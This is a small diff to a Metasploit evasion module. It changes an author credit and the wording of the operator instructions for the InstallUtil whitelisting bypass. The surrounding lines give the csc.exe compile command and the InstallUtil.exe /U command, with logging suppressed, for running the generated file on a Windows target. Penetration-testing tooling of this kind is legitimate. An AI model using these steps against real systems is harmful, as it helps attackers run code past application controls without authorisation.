@@ -15,7 +15,7 @@ class MetasploitModule < Msf::Evasion
       'Author'      =>
         [
           'Nick Tyrer <@NickTyrer>', # for module development
-          'Casey Smith',  # install_util bypass research
+          'Casey Smith',  # for install_util bypass research
         ],
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Evasion
        |                                                                Instructions                                                               |
        |___________________________________________________________________________________________________________________________________________|
        |                                                                                                                                           |
-       | 1.Copy the entire contents of #{datastore['FILENAME']} to the target and execute:                                                                 |
+       | 1.Copy #{datastore['FILENAME']} to the target and execute:                                                                                        |
        | 2.x86{                                                                                                                                    |
        |       Compile using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\csc.exe /out:installutil.exe #{datastore['FILENAME']}                          |
        |       Execute using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe       |
